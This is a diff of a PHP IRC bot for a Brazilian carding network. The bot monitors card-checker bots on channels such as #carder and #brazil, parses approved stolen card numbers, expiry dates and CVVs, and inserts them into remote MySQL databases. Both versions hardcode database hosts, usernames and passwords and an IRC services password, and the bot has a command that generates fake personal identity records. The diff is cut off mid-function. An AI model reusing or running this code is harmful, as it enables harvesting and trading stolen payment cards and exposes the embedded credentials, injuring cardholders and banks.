@@ -1,38 +1,5 @@
 <?php
-
-// SCRIPTS
-require('scripts/luhn.php');
-require('scripts/4devs.php');
-require('scripts/bin.php');
-require('scripts/sro.php');
-require('scripts/temp-mail.php');
-
-// VARIAVEIS
-$version = "2.1";
-$release = "26/07/2019";
-$NAMESERVER = php_uname('n');
-$CPUdistro = php_uname('a');
-
-// GUEST AUTOBAN JOIN/CHANGE
-$nickGuestJOIN = true;
-$nickGuestCHANGE = true;
-
-// SETUP ON/OFF SERVICES
-$checkerGGBB = false;
-$checkerGGELO = false;
-$checkerFULL = false;
-$consultaCADSUS = false;
-
-// SETUP ON/OFF AUTOVOICE
-$autovoice = false;
-
-// PHP VARS
-ini_set('default_charset','UTF-8');
-
-//
-// Funções BRONXnet PHP Bot
-//
-
+// Função do UPTIME
 function Uptime(){
     $str   = @file_get_contents('/proc/uptime');
     $num   = floatval($str);
@@ -44,722 +11,90 @@ function Uptime(){
     return $days." DIAS ".$hours." HORAS ".$mins." MINUTOS ".$secs." SEGUNDOS";
 }
 
-function getStr($string,$start,$end){
-    $str = explode($start,$string);
-    $str = explode($end,$str[1]);
-    return $str[0];
-}
-
-function limpaString($string){
-    $newSTRING = str_replace('<td>
-', '', $string);
-    return $newSTRING;
-}
-
+// FUNÇÃO DO CAPTURADOR
 function captureBR($ccnr,$ccmes,$ccano,$cccvv,$ccbanco,$ccnivel,$cctipo,$ccbandeira,$ccnick){
-    $DBHOSTNAME     =	"norah-gate1.000webhostapp.com:";
-    $DBUSERNAME     =	"id9520515_checknet ";
-    $DBPASSWORD     =	"whoami357";
-    $DBCAPTURE      =	"id9520515_checknet_capture ";
+    $DBHOSTNAME     =	"br17.dialhost.com.br";
+    $DBUSERNAME     =	"chiarell_capture";
+    $DBPASSWORD     =	"tChQX4qV$";
+    $DBCAPTURE      =	"chiarell_capture";
 
     $mysqli = new MySQLi($DBHOSTNAME, $DBUSERNAME, $DBPASSWORD, $DBCAPTURE);
     if($mysqli->connect_error){
         echo "Desconectado! Erro: " . $mysqli->connect_error . "\n";
     }else{
-        $inserir = $mysqli->query("INSERT INTO capturados (cc_numero, cc_mes, cc_ano, cc_cvv, cc_banco, cc_nivel, cc_tipo, cc_bandeira, cc_nick) VALUES ('$ccnr', '$ccmes', '$ccano', '$cccvv', '$ccbanco', '$ccnivel', '$cctipo', '$ccbandeira', '$ccnick')");
+        $inserir = $mysqli->query("INSERT INTO ccbrazil (cc_numero, cc_mes, cc_ano, cc_cvv, cc_banco, cc_nivel, cc_tipo, cc_bandeira, cc_nick) VALUES ('$ccnr', '$ccmes', '$ccano', '$cccvv', '$ccbanco', '$ccnivel', '$cctipo', '$ccbandeira', '$ccnick')");
         if(!$inserir){ echo 'Erro: ', $inserir->error . "\n"; }
     }
     mysqli_close($mysqli);
 }
 
-function IPlookup($ip){
-    $curl = curl_init();
-    $lookupURL = "https://www.ip-tracker.org/locator/ip-lookup.php?ip=" . $ip;
-    curl_setopt($curl, CURLOPT_URL, $lookupURL);
-    curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36");
-    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
-    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
-    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
-    $output = curl_exec($curl);
-    curl_close($curl);
-    return $output;
-}
-
-function pegaIp() {
-    $curl = curl_init();
-    curl_setopt($curl, CURLOPT_URL, "http://alkanas.com/ip.php");
-    curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36");
-    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
-    $output = curl_exec($curl);
-    curl_close($curl);
-    return $output;
-}
-
-//
-// MySQL
-//
-
-function VerificaCliente($nickirc, $identd, $hostirc){
-	echo "NICK: $nickirc \nIDENTD: $identd \nHOSTNAME: $hostirc \n\n";
-
-	$DBHOSTNAME     =	"54.148.214.122";
-	$DBUSERNAME     =	"root";
-	$DBPASSWORD     =	"33tftp478rjqx";
-	$DBPERMITIDOS   =	"BRONXnet";
-
-	$mysqli = new MySQLi($DBHOSTNAME, $DBUSERNAME, $DBPASSWORD, $DBPERMITIDOS);
-
-	// VERIFICA NO DB
-	$result = $mysqli->query("SELECT * FROM `bronx-usuarios` WHERE `user_nick` = '".$nickirc."'");
-	if ($result->num_rows == 1) {
-		$info = $result->fetch_array(MYSQLI_BOTH);
-		if ($identd == $info["user_identd"] && $hostirc == $info["user_hostname"]) {
-			fputs($GLOBALS['socket'], "MODE #carder +v ".$nickirc."\n");
-			return true;
-		} else { return false; }
-	} else { return false; }
-}
-
-function EfetuaLogin($login, $password, $identd, $hostirc, $nickirc){
-	$DBHOSTNAME     =	"54.148.214.122";
-	$DBUSERNAME     =	"root";
-	$DBPASSWORD     =	"33tftp478rjqx";
-	$DBPERMITIDOS   =	"BRONXnet";
-
-	$mysqli = new MySQLi($DBHOSTNAME, $DBUSERNAME, $DBPASSWORD, $DBPERMITIDOS);
-
-	// VERIFICA NO DB
-	$result = $mysqli->query("SELECT * FROM `bronx-clientes` WHERE `cliente_email` = '".$login."' AND `cliente_password` = '".$password."'");
-	// SE TIVER O USUARIO
-        if ($result->num_rows == 1) {
-		$result2 = $mysqli->query("UPDATE `bronx-usuarios` SET `user_identd` = '".$identd."', `user_hostname` = '".$hostirc."' WHERE `user_nick` = '".$nickirc."'");
-		$result3 = $mysqli->query("UPDATE `bronx-clientes` SET `cliente_identd` = '".$identd."', `cliente_host` = '".$hostirc."' WHERE `cliente_nick` = '".$nickirc."'");
-		fputs($GLOBALS['socket'], "PRIVMSG $nickirc :09✔302 - TUDO OKAY » 02AGORA VOCÊ ESTÁ AUTENTICADO PELO BOT 07[COMANDOS LIBERADOS]\n");
-		fputs($GLOBALS['socket'], "MODE #carder +v ".$nickirc."\n");
-	} else {
-		fputs($GLOBALS['socket'], "PRIVMSG $nickirc :04✘ 404 - 05O BOT NÃO CONSEGUIU AUTENTICA-LO ! 07[ TENTE NOVAMENTE ]\n");
-	}
-}
-
-//
-// IRC
-//
-
-// Prevent PHP from stopping the script after 30 sec
-	set_time_limit(0);
-
 // VARIAVEIS
 	$nickname   = 'CheckNet';
 	$master     = 'Norah_C_IV';
 
-// Opening the socket to the CHKnet network
-	$socket = fsockopen("irc.chknet.cc", "6667", $errno, $errstr);
-	echo $errstr;
+// CONEXÃO COM O IRC.CHKNET.CC:6667
+	$server = 'irc.chknet.cc';
+	$port = 6667;
+	$nickname = 'CheckNet';
+	$ident = 'CheckNet';
+	$gecos = 'CheckNet Bot V1.0 By Norah_C_IV';
+	$channel = '#CARDER'
 
-// Send auth info
-	fputs($socket,"USER ".$nickname." 0 * : [".$NAMESERVER."] by 07Unfriended Dark Web\n");
-	fputs($socket,"NICK ".$nickname."\n");
+// EFETUANDO A CONEXÃO COM A REDE
+	$socket = socket_create( AF_INET, SOCK_STREAM, SOL_TCP );
+	$error = socket_connect( $socket, $server, $port );
 
-// Force an endless while
-while(1) {
-
-	// Continue the rest of the script here
-	while($data = fgets($socket, 512)) {
-
-		//DEBUG
-		//print_r($data);
-
-		flush();
-
-		// Separate all data
-		$ex = explode(' ', $data);
-
-		// Send PONG back to the server
-		if($ex[0] == "PING"){
-			fputs($socket, "PONG ".$ex[1]."\n");
-		}
-		// autoIDENTIFY
-		if($ex[0] == ":NickServ!services@services.chknet" && $ex[6] == "registered") {
-                        fputs($socket, "PRIVMSG NickServ :identify norah235144\n");
-		}
-		// autoJOIN
-		if($ex[0] == ":NickServ!services@services.chknet" && $ex[4] == "accepted") {
-                        fputs($socket,"JOIN #brazil\n");
-                        fputs($socket,"JOIN #carder\n");
-			fputs($socket,"JOIN #jcheck\n");
-                        fputs($socket,"JOIN #alternative\n");
-                        fputs($socket,"JOIN #payment\n");
-                        fputs($socket,"JOIN #check\n");
-                        fputs($socket,"JOIN #cctools\n");
-			fputs($socket,"JOIN #check\n");
-		}
-		// VIADEX #brazil
-		if($ex[0] == ":chkViadex24!bot@chkViadex24PontoCom" && $ex[1] == "PRIVMSG" && $ex[2] == "#brazil"){
-			$posSTATUS = strpos($ex[4], "APROVADA");
-			if($posSTATUS === false) {
-			} else {
-				$exCC = explode('|', $data);
-				$exINFO = explode('»', $exCC[0]);
-				$exCC = str_replace(" ", "", $exINFO[1]);
-				$exMES = str_replace(" ", "", $exINFO[2]);
-				$exANO = str_replace(" ", "", $exINFO[3]);
-				$exCVV = str_replace(" ", "", $exINFO[4]);
-				$nicktmp = getStr($ex[3], "<", ">");
-				$tempBIN = substr($exCC, 0, 6);
-				$dadosBIN = pegaBin($tempBIN);
-				$jsonSCHEME = $dadosBIN[7];
-				$jsonBRAND = $dadosBIN[9];
-				$jsonNAME = convertCountry($dadosBIN[6]);
-				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
-				if($jsonNAME == "BRAZIL") {
-					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],$nicktmp);
-					fputs($socket, "PRIVMSG $master :09[✔APROVADA] → 03".$exCC." ".$exMES.$exANO." ".$exCVV." 01[NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #brazil \n");
-				}
-				fputs($socket, "PRIVMSG #carder :09[✔APROVADA] → 03".$exCC." ".$exMES.$exANO." ".$exCVV." 01[NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #brazil \n");
-			}
-		}
-		// JMerchant #jcheck
-		if($ex[0] == ":JMerchant!~JMerchant@JMerch.ChkNet.Bot" && $ex[1] == "PRIVMSG" && $ex[2] == "#jcheck") {
-			$posSTATUS = strpos($data, "SUCSS ✔");
-			if($posSTATUS === false) {
-			} else {
-				$exCC = $ex[5];
-				$exMES = $ex[7];
-				$exANO = $ex[9];
-				$exCVV = $ex[11];
-				$nicktmp = str_replace(':', '', str_replace("12", "", $ex[3]));
-				$tempBIN = substr($ex[5], 0, 6);
-				$dadosBIN = pegaBin($tempBIN);
-				$jsonSCHEME = $dadosBIN[7];
-				$jsonBRAND = $dadosBIN[9];
-				$jsonNAME = convertCountry($dadosBIN[6]);
-				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
-				if($jsonNAME == "BRAZIL") {
-					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],"JMerchant");
-					fputs($socket, "PRIVMSG $master :09[✔APROVADA] → 03".$exCC." ".$exMES.$exANO." ".$exCVV." 01[NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #jcheck \n");
-				}
-				fputs($socket, "PRIVMSG #carder :09[✔APROVADA] → 03".$exCC." ".$exMES.$exANO." ".$exCVV." 01[NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #jcheck \n");
-			}
-		}
-		// DjRogerinhoBOT #alternative
-		if($ex[0] == ":DjRogerinhoBOT!~DjRogerin@xvideos.com" && $ex[1] == "PRIVMSG" && $ex[2] == "#alternative") {
-			$posSTATUS = strpos($data, "[00 - APROVADA]");
-			if($posSTATUS === false) {
-			} else {
-				$exCC = $ex[14];
-				$exMES = $ex[16];
-				$exANO = substr($ex[18], 2, 2);
-				$exCVV = $ex[20];
-				$nicktmp = getStr($ex[3], "<", ">");
-				$tempBIN = substr($ex[14], 0, 6);
-				$dadosBIN = pegaBin($tempBIN);
-				$jsonSCHEME = $dadosBIN[7];
-				$jsonBRAND = $dadosBIN[9];
-				$jsonNAME = convertCountry($dadosBIN[6]);
-				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
-				if($jsonNAME == "BRAZIL") {
-					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],"DjRogerinhoBOT");
-					fputs($socket, "PRIVMSG $master :09[✔APROVADA] → 03".$exCC." ".$exMES.$exANO." ".$exCVV." 01[NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #alternative \n");
-					}
-				fputs($socket, "PRIVMSG #carder :09[✔APROVADA] → 03".$exCC." ".$exMES.$exANO." ".$exCVV." 01[NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #alternative n");
-
-			}
-		}
-		// B4nk #payment
-		if($ex[0] == ":B4nk!~SECURITY@1442D50B.21F1877E.C294562E.IP" && $ex[1] == "PRIVMSG" && $ex[2] == "#payment"){
-			$posSTATUS = strpos($ex[11], "APPROVED");
-			if($posSTATUS === false) {
-				print_r($ex);
-			} else {
-				$exCC = $ex[5];
-				if (strlen($ex[6]) == 3) { $exDATAtemp = "0".$ex[6]; }
-				else { $exDATAtemp = $ex[6]; }
-				$exMES = substr($exDATAtemp, 0, 2);
-				$exANO = substr($exDATAtemp, 2, 2);
-				$exCVV = $ex[7];
-				$tempBIN = substr($ex[5], 0, 6);
-				$dadosBIN = pegaBin($tempBIN);
-				$nicktmp = str_replace('', '', $ex[5]);
-				$jsonSCHEME = $dadosBIN[7];
-				$jsonBRAND = $dadosBIN[9];
-				$jsonNAME = convertCountry($dadosBIN[6]);
-				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
-				if($jsonNAME == "BRAZIL") {
-					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],"B4nk");
-					fputs($socket, "PRIVMSG $master :09[✔APROVADA] → 03".$exCC." ".$exMES.$exANO." ".$exCVV." 01[NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #payment \n");
-					}
-				fputs($socket, "PRIVMSG #carder :09[✔APROVADA] → 03".$exCC." ".$exMES.$exANO." ".$exCVV." 01[NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #payment \n");
-			}
-		}
-		// ChkNet #unix
-		if($ex[0] == ":ChkNet!ChkNet@B7E9A087.ABEF7087.99DF22F4.IP" && $ex[1] == "PRIVMSG" && $ex[2] == "#unix"){
-			$posSTATUS = strpos($ex[11], "Approval");
-			if($posSTATUS === false) {
-			} else {
-				$exCC = str_replace("", "", $ex[4]);
-				$exTEMP = str_replace('', '', $ex[5]);
-				$exMES = substr($exTEMP, 0, 2);
-				$exANO = substr($exTEMP, 2, 2);
-				$exCVV = $ex[6];
-				$tempBIN = substr($exCC, 0, 6);
-				$dadosBIN = pegaBin($tempBIN);
-				$nicktmp = str_replace(":", "", str_replace(",", "", $ex[3]));
-				$jsonSCHEME = $dadosBIN[7];
-				$jsonBRAND = $dadosBIN[9];
-				$jsonNAME = convertCountry($dadosBIN[6]);
-				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
-				fputs($socket, "PRIVMSG #carder :09[✔APROVADA] → 03".$exCC." ".$exMES.$exANO." ".$exCVV." 01[NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #unix \n");
-				if($jsonNAME == "BRAZIL") {
-					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],$nicktmp);
-					fputs($socket, "PRIVMSG $master :09[✔APROVADA] → 03".$exCC." ".$exMES.$exANO." ".$exCVV." 01[NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #unix \n");
-				}
-			}
-		}
-		// CheckBOT #cctools
-		if($ex[0] == ":CheckBOT!~CheckBOT@Developer.FurkanTR" && $ex[1] == "PRIVMSG" && $ex[2] == "#cctools"){
-			$posSTATUS = strpos($ex[14], "APPROVED");
-			if($posSTATUS === false) {
-			} else {
-				$exCC = str_replace("1503", "", $ex[7]);
-				$exMES = $ex[8];
-				$exANO = substr($ex[9], 2, 2);
-				$exCVV = $ex[10];
-				$tempBIN = substr($exCC, 0, 6);
-				$dadosBIN = pegaBin($tempBIN);
-				$nicktmp = str_replace("00", "", str_replace("07", "", $ex[5]));
-				$jsonSCHEME = $dadosBIN[7];
-				$jsonBRAND = $dadosBIN[9];
-				$jsonNAME = convertCountry($dadosBIN[6]);
-				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
-				fputs($socket, "PRIVMSG #carder :09[✔APROVADA] → 03".$exCC." ".$exMES.$exANO." ".$exCVV." 01[NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #cctools \n");
-				if($jsonNAME == "BRAZIL") {
-					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],$nicktmp);
-					fputs($socket, "PRIVMSG $master :09[✔APROVADA] → 03".$exCC." ".$exMES.$exANO." ".$exCVV." 01[NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #cctools \n");
-				}
-			}
-		}
-		// Freechk #check
-		if($ex[0] == ":Freechk!~authorize@AC5A5AF6.EF3F9A09.7DC749EA.IP" && $ex[1] == "PRIVMSG" && $ex[2] == "#check"){
-			$posSTATUS = strpos($ex[12], "APPROVED");
-			if($posSTATUS === false) {
-			} else {
-				$exCC = $ex[6];
-				$exMES = substr($ex[7], 0, 2);
-				$exANO = substr($ex[7], 2, 2);
-				$exCVV = $ex[8];
-				$nicktmp = $ex[4];
-				$tempBIN = substr($ex[6], 0, 6);
-				$dadosBIN = pegaBin($tempBIN);
-				$jsonSCHEME = $dadosBIN[7];
-				$jsonBRAND = $dadosBIN[9];
-				$jsonNAME = convertCountry($dadosBIN[6]);
-				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
-				if($jsonNAME == "BRAZIL") {
-					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],$nicktmp);
-					fputs($socket, "PRIVMSG $master :09[✔APROVADA] → 03".$exCC." ".$exMES.$exANO." ".$exCVV." 01[NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #check \n");
-					}
-				fputs($socket, "PRIVMSG #carder :09[✔APROVADA] → 03".$exCC." ".$exMES.$exANO." ".$exCVV." 01[NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #check \n");
-			}
-		}
-		// OwnChk #unix and #payment
-		if($ex[0] == ":OwnChk!~IamAwesom@msg.independent.for.premium" && $ex[1] == "PRIVMSG"){
-			$posSTATUS = strpos($ex[12], "APPROVED");
-			if($posSTATUS === false) {
-			} else {
-				$exCC = $ex[6];
-				$exMES = substr($ex[7], 0, 2);
-				$exANO = substr($ex[7], 2, 2);
-				$exCVV = $ex[8];
-				$nicktmp = $ex[4];
-				$tempBIN = substr($ex[6], 0, 6);
-				$dadosBIN = pegaBin($tempBIN);
-				$jsonSCHEME = $dadosBIN[7];
-				$jsonBRAND = $dadosBIN[9];
-				$jsonNAME = convertCountry($dadosBIN[6]);
-				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
-				if($jsonNAME == "BRAZIL") {
-					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],$nicktmp);
-					fputs($socket, "PRIVMSG $master :09[✔APROVADA] → 03".$exCC." ".$exMES.$exANO." ".$exCVV." 01[NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] $ex[2] \n");
-					}
-				fputs($socket, "PRIVMSG #carder :09[✔APROVADA] → 03".$exCC." ".$exMES.$exANO." ".$exCVV." 01[NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] $ex[2] \n");
-			}
-		}
-		// COMANDOS ADMIN
-		// :JBiLTDA!t7DS@jbiltda.kiprest.com.br PRIVMSG BRONXnet :!ip
-		if($ex[1] == "PRIVMSG" && $ex[2] == $nickname){
-			$comando = str_replace(":!", "", preg_replace('/\s+/', '', $ex[3]));
-			$nicktmp = explode('!', $ex[0]);
-			$nickCMD = str_replace(":", "", $nicktmp[0]);
-			$hosttmp = explode('@', $nicktmp[1]);
-			$identdtmp = $hosttmp[0];
-			switch ($comando) {
-			    case auth:
-			        if(isset($ex[4]) && isset($ex[5])) {
-					$eMAIL	= trim($ex[4]);
-					$pASSWD	= md5(preg_replace('/\s+/', '', $ex[5]));
-					EfetuaLogin($eMAIL, $pASSWD, $identdtmp, $hosttmp[1], $nickCMD);
-				}
-			        break;
-			    case status:
-				if($checkerGGBB) { $statusGGBB = "03✔ ATIVO"; } else { $statusGGBB = "05✘ DESATIVADO05"; }
-				if($checkerGGELO) { $statusGGELO = "03✔ ATIVO"; } else { $statusGGELO = "05✘ DESATIVADO05"; }
-				if($checkerFULL) { $statusFULL = "03✔ ATIVO"; } else { $statusFULL = "05✘ DESATIVADO05"; }
-				if($consultaCADSUS) { $statusconsulta = "03✔ ATIVO"; } else { $statusconsulta = "05✘ DESATIVADO05"; }
-				fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] GG-BB [$statusGGBB] GG-ELO [$statusGGELO] CHK-FULL [$statusFULL] CONSULTA NOME/CPF/CNS [$statusconsulta] \n");
-			        break;
-			    case version:
-			        fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] → 07CheckNet BOT OF CARDING NETWORK [VERSÃO] $version (VERSÃO DE TESTE) ATUALIZADO DIA: [$release]\n");
-			        break;
-			    case dados:
-				$dados = json_decode(GeraPessoa());
-			        fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] → [NOME] $dados->nome [CPF] $dados->cpf [RG] $dados->rg [NASCIMENTO] $dados->data_nasc [CEP] $dados->cep [RUA] $dados->endereco, $dados->numero [BAIRRO] $dados->bairro [CIDADE] $dados->cidade [ESTADO] $dados->estado [TELEFONE] $dados->celular\n");
-			        break;
-			    case bin:
-				if (isset($ex[4]) && strlen(preg_replace('/\s+/', '', $ex[4])) >= 6) {
-					$tempBIN = substr($ex[4], 0, 6);
-					$dadosBIN = pegaBin($tempBIN);
-					$jsonSCHEME = $dadosBIN[7];
-					$jsonNAME = convertCountry($dadosBIN[6]);
-					$jsonTYPE = $dadosBIN[8];
-					$jsonBRAND = $dadosBIN[9];
-					$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
-					fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] → [BIN] $tempBIN [BANDEIRA] $jsonSCHEME [PAÍS] $jsonNAME [BANCO] $binBANCO [TIPO] $jsonTYPE [CATEGORIA] $jsonBRAND \n");
-				} elseif (strlen($ex[4]) < 6) {
-					fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] → [ERRO] Bin deve conter 6 numeros. 07[ Exemplo: !bin 552289 ]\n");
-				} else {
-					fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] → [ERRO] Bin deve conter 6 numeros. 07[ Exemplo: !bin 552289 ]\n");
-				}
-			        break;
-			    case lookup:
-				if ($comando == "lookup") {
-				if (isset($ex[4]) && strlen($ex[4]) >= 7) {
-					$lookup = IPlookup(preg_replace('/\s+/', '', $ex[4]));
-					$reverseDNS = limpaString(getStr($lookup,'<th>Reverse DNS:</th>','</td>'));
-					$country = getStr($lookup, 'Country:</th><td> ', ' &nbsp;&nbsp;');
-					$state = str_replace("<td class='tracking'>", '', str_replace("<td class='tracking lessimpt'>", '', getStr($lookup, 'State:</th>', '</td>')));
-					$city = str_replace('<td> ', '', str_replace("<td class='vazno'>", '', getStr($lookup, 'City Location:</th>', '</td>')));
-					$isp = getStr($lookup, 'ISP:</th><td>', '</td>');
-					$asnumber = getStr($lookup, 'AS Number:</th><td>', '</td>');
-					$iphostname = str_replace("<td class='tracking'>", '', getStr($lookup, 'Hostname:</th> ', '</td><'));
-                                        fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] → [IP-LOOKUP] ".preg_replace('/\s+/', '', $ex[4])." [HOSTNAME] $iphostname [ISP] $isp [PAÍS] $country [ESTADO] $state [CIDADE] $city [AS] $asnumber\n");
-                                } else { fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] → Insira o IP para consulta ( Exemplo: !lookup 191.189.23.192 )\n"); } }
-                                break;
-			}
-			if ($ex[0] == ":Norah_C_IV!~Norah_C_IV@Carding-Network.onion" || $ex[0] == ":GENEILTON01!~GENEILTON@FR13ND.COM" || $ex[0] == ":j4ckass!~pmesp.gov@76330C66.C2B11953.5F28726B.IP") {
-			    switch ($comando) {
-			    case comandos:
-				fputs($socket, "PRIVMSG $nickCMD :[LISTA DE COMANDOS ADMIN]\n");
-				fputs($socket, "PRIVMSG $nickCMD :!desatvggbb - Desativa Checker GERADAS Banco do Brasil!\n");
-				fputs($socket, "PRIVMSG $nickCMD :!desatvggelo - Desativa Checker GERADAS ELO\n");
-				fputs($socket, "PRIVMSG $nickCMD :!desatvgate - Desativa Checker FULL\n");
-				fputs($socket, "PRIVMSG $nickCMD :!autovoiceoff - Desativa AutoVoice no CANAL #CARDER\n");
-				fputs($socket, "PRIVMSG $nickCMD :!desatvconsultas - Desativa consulta NOME/CPF\n");
-				fputs($socket, "PRIVMSG $nickCMD :!desatvexterminador - Desativa banimento de Guest\n");
-				fputs($socket, "PRIVMSG $nickCMD :!desatvguestchange - Desativa banimento de mudança de nick para Guest\n");
-				fputs($socket, "PRIVMSG $nickCMD :!enableCheckGGBB - Ativa Checker GERADAS Banco do Brasil\n");
-				fputs($socket, "PRIVMSG $nickCMD :!ativarggelo - Ativa Checker GERADAS ELO\n");
-				fputs($socket, "PRIVMSG $nickCMD :!ativargate - Ativa Checker FULL\n");
-				fputs($socket, "PRIVMSG $nickCMD :!autovoiceon - Ativa AutoVoice no CANAL #CARDER\n");
-				fputs($socket, "PRIVMSG $nickCMD :!ativarconsultas - Ativa consulta NOME/CPF/CNS\n");
-				fputs($socket, "PRIVMSG $nickCMD :!ativarexterminador - Ativa banimento de Guest\n");
-				fputs($socket, "PRIVMSG $nickCMD :!ativarguestchange - Ativa banimento de mudança de nick para Guest\n");
-			        break;
-			    case desatvggelo:
-				$checkerGGELO = false;
-				fputs($socket, "PRIVMSG #CARDER :[4DESABILITADO] Checker de GERADAS ELO!\n");
-			        break;
-			    case ativarggelo:
-				$checkerGGELO = true;
-				fputs($socket, "PRIVMSG #CARDER :[3HABILITADO] Checker de GERADAS ELO!\n");
-			        break;
-			    case autovoiceoff:
-				$autovoice = false;
-				fputs($socket, "PRIVMSG #CARDER :[4DESABILITADO] Auto Voice no CANAL #CARDER!\n");
-			        break;
-			    case autovoiceon:
-				$autovoice = true;
-				fputs($socket, "PRIVMSG #CARDER :[3HABILITADO] Auto Voice no CANAL #CARDER!\n");
-			        break;
-			    case desatvggbb:
-				$checkerGGBB = false;
-				fputs($socket, "PRIVMSG #CARDER :[4DESABILITADO] Checker de GERADAS BANCO DO BRASIL!\n");
-			        break;
-			    case desatvgate:
-				$checkerFULL = false;
-				fputs($socket, "PRIVMSG #CARDER :[4DESABILITADO] Checker de FULL!\n");
-			        break;
-			    case desatvconsultas:
-				$consultaCADSUS = false;
-				fputs($socket, "PRIVMSG #CARDER :[4DESABILITADO] Consulta NOME/CPF!\n");
-			        break;
-			    case desatvexterminador:
-				$nickGuestJOIN = false;
-				fputs($socket, "PRIVMSG #CARDER :[4DESABILITADO] Banimento automático de Guest/AndroUser!\n");
-			        break;
-			    case desatvguestchange:
-				$nickGuestCHANGE = false;
-				fputs($socket, "PRIVMSG #CARDER :[4DESABILITADO] Banimento automático de mudança de nick para Guest/AndroUser!\n");
-			        break;
-			    case ativarexterminador:
-				$nickGuestJOIN = true;
-				fputs($socket, "PRIVMSG #CARDER :[3HABILITADO] Banimento automático de Guest/AndroUser!\n");
-			        break;
-			    case ativarguestchange:
-				$nickGuestCHANGE = true;
-				fputs($socket, "PRIVMSG #CARDER :[3HABILITADO] Banimento automático de mudança de nick para Guest/AndroUser!\n");
-			        break;
-			    case ativarggbb:
-				$checkerGGBB = true;
-				fputs($socket, "PRIVMSG #CARDER :[3HABILITADO] Checker de GERADAS BANCO DO BRASIL!\n");
-			        break;
-			    case ativargate:
-				$checkerFULL = true;
-				fputs($socket, "PRIVMSG #CARDER :[3HABILITADO] Checker de Cartões FULL!\n");
-			        break;
-			    case ativarconsultas:
-				$consultaCADSUS = true;
-				fputs($socket, "PRIVMSG #CARDER :[3HABILITADO] Consulta NOME/CPF/CNS!\n");
-			        break;
-			    case ban:
-				$toBan = preg_replace('/\s+/', '', $ex[4]);
-				if(isset($ex[4]) && $ex[4] != "") {
-					fputs($socket, "MODE #CARDER +b $toBan\n");
-				}
-			    case kick:
-				$toKick = preg_replace('/\s+/', '', $ex[4]);
-				if(isset($ex[4]) && $ex[4] != "") {
-					fputs($socket, "KICK #CARDER ".$toKick." :KICK REQUEST [$nickCMD]\n");
-				}
-			        break;
-			    case join:
-				$toJoin = preg_replace('/\s+/', '', $ex[4]);
-				if(isset($ex[4]) && $ex[4] != "") {
-					fputs($socket, "JOIN $toJoin \n");
